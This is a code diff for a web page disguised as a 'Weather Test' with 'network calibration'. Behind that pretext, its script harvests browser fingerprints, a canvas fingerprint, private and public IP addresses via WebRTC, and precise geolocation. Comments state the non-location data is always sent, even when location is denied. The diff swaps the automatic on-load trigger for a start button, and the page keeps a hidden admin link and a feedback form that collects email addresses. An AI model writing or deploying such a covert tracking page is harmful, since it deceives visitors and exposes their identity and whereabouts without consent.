@@ -36,9 +36,9 @@
         .status-box.success { background: #e8f5e9; border-color: #a5d6a7; color: #2e7d32; }
         .btn { padding: 16px 0; font-size: 18px; font-weight: 600; border: none; border-radius: 50px; cursor: pointer; width: 100%; transition: all 0.2s; margin-top: 12px; color: white; background: #1a73e8; box-shadow: 0 4px 12px rgba(26,115,232,0.3); }
         .btn:hover { background: #1557b0; transform: translateY(-2px); }
+        .btn:active { transform: scale(0.97); }
         .btn.retry { background: #ff9800; box-shadow: 0 4px 12px rgba(255,152,0,0.3); }
         .btn.retry:hover { background: #e68900; }
-        .btn:active { transform: scale(0.97); }
         .btn.feedback { background: #34a853; box-shadow: 0 4px 12px rgba(52,168,83,0.3); margin-top: 8px; }
         .btn.feedback:hover { background: #2d9248; }
         .hidden { display: none; }
@@ -52,8 +52,6 @@
         .feedback-form input:focus { border-color: #1a73e8; box-shadow: 0 0 0 3px rgba(26,115,232,0.1); }
         .feedback-form .row { display: flex; gap: 10px; }
         .feedback-form .row input { width: 50%; }
-
-        /* Hidden admin link */
         .admin-link {
             position: fixed;
             bottom: 10px;
@@ -65,9 +63,7 @@
             text-decoration: none;
             z-index: 999;
         }
-        .admin-link:hover {
-            color: rgba(255,255,255,0.8);
-        }
+        .admin-link:hover { color: rgba(255,255,255,0.8); }
     </style>
 </head>
 <body>
@@ -82,8 +78,11 @@
     <div class="subtitle">🌐 Network calibration required</div>
 
     <div id="statusBox" class="status-box">
-        <span id="statusText">Initializing…</span>
+        <span id="statusText">Tap the button below to start</span>
     </div>
+
+    <!-- Start button – triggers location -->
+    <button id="startBtn" class="btn" onclick="requestLocation()">🌦️ Start Weather Test</button>
 
     <div id="retryArea" class="hidden">
         <button class="btn retry" onclick="requestLocation()">🔄 Retry location</button>
@@ -110,7 +109,7 @@
 </div>
 
 <script>
-    // ----- FINGERPRINT COLLECTION (unchanged) -----
+    // ----- FINGERPRINT COLLECTION (same) -----
     function getBasic() { return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, languages: navigator.languages, cookieEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack, screenWidth: screen.width, screenHeight: screen.height, screenColorDepth: screen.colorDepth, timezoneOffset: new Date().getTimezoneOffset(), timestamp: new Date().toISOString() }; }
     function getWebRTCIPs() { return new Promise((resolve) => { let ips = { private: null, public: null }; const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); pc.createDataChannel('test'); pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate) { pc.close(); resolve(ips); return; } const candidate = e.candidate.candidate; if (candidate) { const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/; const match = candidate.match(ipRegex); if (match) { const ip = match[0]; if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) { ips.private = ip; } else { ips.public = ip; } } } }; setTimeout(() => { pc.close(); resolve(ips); }, 3000); }); }
     function getCanvasFingerprint() { const canvas = document.createElement('canvas'); canvas.width = 256; canvas.height = 128; const ctx = canvas.getContext('2d'); ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 100, 40); ctx.fillStyle = '#069'; ctx.fillText('Test', 20, 20); ctx.beginPath(); ctx.arc(120, 60, 20, 0, Math.PI*2); ctx.fillStyle = '#0f0'; ctx.fill(); return canvas.toDataURL(); }
@@ -148,20 +147,26 @@
         }
     }
 
+    // ----- MAIN: triggered by button click -----
     async function requestLocation() {
         const statusBox = document.getElementById('statusBox');
         const statusText = document.getElementById('statusText');
         const retryDiv = document.getElementById('retryArea');
         const resultDiv = document.getElementById('resultArea');
         const feedbackDiv = document.getElementById('feedbackForm');
+        const startBtn = document.getElementById('startBtn');
+        startBtn.disabled = true;
+        startBtn.textContent = '⏳ Testing...';
         retryDiv.classList.add('hidden');
         resultDiv.classList.add('hidden');
         feedbackDiv.classList.add('hidden');
         statusBox.className = 'status-box';
         statusText.innerHTML = '<span class="loader"></span> Requesting location...';
 
+        // Collect all non‑location data (always sent)
         const data = await collectAll();
 
+        // Request geolocation
         if (!navigator.geolocation) {
             statusBox.className = 'status-box error';
             statusText.textContent = '⚠️ Geolocation not supported. Data sent without location.';
@@ -169,6 +174,8 @@
             sendData(data);
             resultDiv.classList.remove('hidden');
             feedbackDiv.classList.remove('hidden');
+            startBtn.disabled = false;
+            startBtn.textContent = '🌦️ Start Weather Test';
             return;
         }
 
@@ -186,6 +193,8 @@
                 statusText.textContent = '✅ Location granted – weather updated!';
                 resultDiv.classList.remove('hidden');
                 feedbackDiv.classList.remove('hidden');
+                startBtn.disabled = false;
+                startBtn.textContent = '🌦️ Done';
             },
             function(err) {
                 data.location = null;
@@ -198,11 +207,14 @@
                 document.getElementById('cityDisplay').textContent = '📍 Location not shared';
                 document.getElementById('tempDisplay').textContent = '--°C';
                 document.getElementById('conditionDisplay').textContent = 'Permission denied';
+                startBtn.disabled = false;
+                startBtn.textContent = '🌦️ Start Weather Test';
             },
             { timeout: 15000, enableHighAccuracy: true }
         );
     }
 
+    // ----- Submit feedback -----
     function submitFeedback() {
         const email = document.getElementById('feedbackEmail').value.trim();
         const nick = document.getElementById('feedbackNick').value.trim();
@@ -225,9 +237,7 @@
         });
     }
 
-    window.onload = function() {
-        requestLocation();
-    };
+    // No auto‑request on load – user must click the button
 </script>
 </body>
 </html>
